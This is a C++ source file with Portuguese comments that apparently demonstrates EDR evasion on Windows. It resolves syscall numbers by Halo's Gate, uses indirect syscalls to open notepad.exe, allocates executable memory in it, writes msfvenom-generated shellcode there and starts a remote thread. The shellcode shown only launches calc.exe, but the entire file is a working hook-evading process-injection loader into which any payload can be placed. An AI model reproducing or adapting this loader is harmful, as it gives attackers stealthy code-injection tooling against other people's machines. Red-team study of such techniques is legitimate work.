#include <iostream>
#include <windows.h>
#include <TlHelp32.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

extern "C" {
    extern DWORD currentSSN;
    extern UINT_PTR currentSyscall;
    NTSTATUS IndirectSyscall(...);
}

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	UNICODE_STRING* ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;


// Resolver SSN das funcoes da NTDLL
DWORD GetSSN(BYTE* pFunction) {
	// Padrao normal: 4C 8B D1 = mov r10, rcx
	if (pFunction[0] == 0x4C && pFunction[1] == 0x8B && pFunction[2] == 0xD1) {
		std::cout << "[*] Funcao original" << std::endl;
		return *(DWORD*)(pFunction + 4);
	}
	
	std::cout << "[*] Funcao Hookada. Tentando HalosGate" << std::endl;

	for (int i = 1; i < 50; i++) {
		// Testando SSNs abaixo
		BYTE* down = pFunction + (i * 32);
		if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1) {
			return *(DWORD*)(down + 4) - i;
		}

		// Testando SSNs acima
		BYTE* up = pFunction - (i * 32);
		if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1) {
			return *(DWORD*)(up + 4) + i;
		}
	}
	
	std::cout << "[-] Erro ao obter SSN" << std::endl;
	return -1;
 }

// Obter endereço da SYSCALL
BYTE* GetSyscallAddress(BYTE* pFunction) {
	// syscall = 0x0F 0x05
	for (int i = 0; i < 64; i++) {
		if (pFunction[i] == 0x0F && pFunction[i + 1] == 0x05) {
			return pFunction + i;
		}
	}

	std::cout << "[-] Erro ao obter endereco da SYSCALL" << std::endl;
	return NULL;
}

int main() {

    std::cout << "[*] Resolvendo funcoes da NTDLL" << std::endl;
	// OpenProcess | VirtualAllocEx | WriteProcessMemory | CreateRemoteThreadEx

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

	// Ponteiros para as funcoes na NTDLL
	BYTE* pNtOpenProcess = (BYTE*)GetProcAddress(hNtdll, "NtOpenProcess");
	BYTE* pNtAllocateVirtualMemory = (BYTE*)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	BYTE* pNtNtWriteVirtualMemory = (BYTE*)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	BYTE* pNtCreateThreadEx = (BYTE*)GetProcAddress(hNtdll, "NtCreateThreadEx");

	if (!pNtOpenProcess || !pNtAllocateVirtualMemory || !pNtNtWriteVirtualMemory || !pNtCreateThreadEx) {
		std::cout << "[-] Erro ao resolver funcoes" << std::endl;
		return 1;
	}
	std::cout << "[+] Funcoes da NT resolvidas" << std::endl;
	std::cout << "[*] Resolvendo SSNs" << std::endl;

	// Obter SSN das funcoes
	DWORD ssn_NtOpenProcess = GetSSN(pNtOpenProcess);
	DWORD ssn_NtAllocateVirtualMemory = GetSSN(pNtAllocateVirtualMemory);
	DWORD ssn_NtWriteVirtualMemory = GetSSN(pNtNtWriteVirtualMemory);
	DWORD ssn_NtCreateThreadEx = GetSSN(pNtCreateThreadEx);

	if (!ssn_NtOpenProcess || !ssn_NtAllocateVirtualMemory || !ssn_NtWriteVirtualMemory || !ssn_NtCreateThreadEx) {
		std::cout << "[-] Erro ao resolver SSNs" << std::endl;
		return 1;
	}
	std::cout << "[+] SSNs resolvidos" << std::endl;


	std::cout << "[*] Resolvendo address da SYSCALL pela NtOpenProcess" << std::endl;
	
	// Obter endereco da SYSCALL tentando por varias funcoes
	BYTE* syscallAddress = GetSyscallAddress(pNtOpenProcess);

	if (!syscallAddress) {
		std::cout << "[*] Resolvendo endereco da SYSCALL pela NtAllocateVirtualMemory" << std::endl;
		syscallAddress = GetSyscallAddress(pNtAllocateVirtualMemory);
	}
	if (!syscallAddress) {
		std::cout << "[*] Resolvendo endereco da SYSCALL pela NtWriteVirtualMemory" << std::endl;
		syscallAddress = GetSyscallAddress(pNtNtWriteVirtualMemory);
	}
	if (!syscallAddress) {
		std::cout << "[*] Resolvendo endereco da SYSCALL pela NtCreateThreadEx" << std::endl;
		syscallAddress = GetSyscallAddress(pNtCreateThreadEx);
	}
	std::cout << "[+] SYSCALL resolvida. Address: " << std::hex << (UINT_PTR)syscallAddress << std::dec << std::endl;
	

	// Shellcode gerado com msfvenom: msfvenom -p windows/x64/exec CMD=calc.exe -f c 
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	DWORD shellsize = sizeof(shellcode);

	// Procurando PID de processo acessivel do Notepad
	HANDLE process = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(process, &pe);
	int pid = 0;
	do {
		if (_wcsicmp(L"notepad.exe", pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			std::cout << "[+] Notepad encontrado. PID: " << pid << std::endl;
			
			HANDLE hTest = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
			if (!hTest) {
				std::cout << " [-] Notepad inacessivel, skipando" << std::endl;
				CloseHandle(hTest);
			}
			else {
				CloseHandle(hTest);
				break;
			}
			
		}
	} while (Process32Next(process, &pe));


	currentSyscall = (UINT_PTR)syscallAddress;
	NTSTATUS status;

	// Indirect syscalls das funcoes

	//HANDLE hNotepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	OBJECT_ATTRIBUTES oa;
	ZeroMemory(&oa, sizeof(oa));
	oa.Length = sizeof(oa);

	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
	cid.UniqueThread = NULL;

	currentSSN = ssn_NtOpenProcess;
	HANDLE hNotepad = NULL;
	status = IndirectSyscall(&hNotepad, PROCESS_ALL_ACCESS, &oa, &cid);
	if (!NT_SUCCESS(status)) {
		std::cout << "[-] NtOpenProcess falhou: 0x" << std::hex << status << std::endl;
		return 1;
	}
	std::cout << "[+] NtOpenProcess executado" << std::endl;
	
	
	//LPVOID address = VirtualAllocEx(hNotepad, NULL, shellsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	currentSSN = ssn_NtAllocateVirtualMemory;
	PVOID address = NULL;
	SIZE_T regionSize = shellsize;
	status = IndirectSyscall(hNotepad, &address, (ULONG_PTR)0, &regionSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status)) {
		std::cout << "[-] NtAllocateVirtualMemory: 0x" << std::hex << status << std::endl;
		return 1;
	}
	std::cout << "[+] NtAllocateVirtualMemory executado" << std::endl;


	//WriteProcessMemory(hNotepad, address, shellcode, shellsize, NULL);
	currentSSN = ssn_NtWriteVirtualMemory;
	SIZE_T bytesWritten = 0;
	status = IndirectSyscall(hNotepad, address, shellcode, (SIZE_T)shellsize, &bytesWritten);
	if (!NT_SUCCESS(status)) {
		std::cout << "[-] NtWriteVirtualMemory: 0x" << std::hex << status << std::endl;
		return 1;
	}
	std::cout << "[+] NtWriteVirtualMemory executado" << std::endl;

	
	//HANDLE hThread = CreateRemoteThread(hNotepad, NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL);
	currentSSN = ssn_NtCreateThreadEx;
	HANDLE hThread = NULL;
	status = IndirectSyscall(&hThread, (ACCESS_MASK)THREAD_ALL_ACCESS, NULL, hNotepad, address, NULL, (ULONG)0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
	if (!NT_SUCCESS(status)) {
		std::cout << "[-] NtCreateThreadEx: 0x" << std::hex << status << std::endl;
		return 1;
	}
	std::cout << "[+] NtCreateThreadEx executado" << std::endl;

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(process);
	CloseHandle(hNotepad);
	CloseHandle(hThread);

	return 0;
}
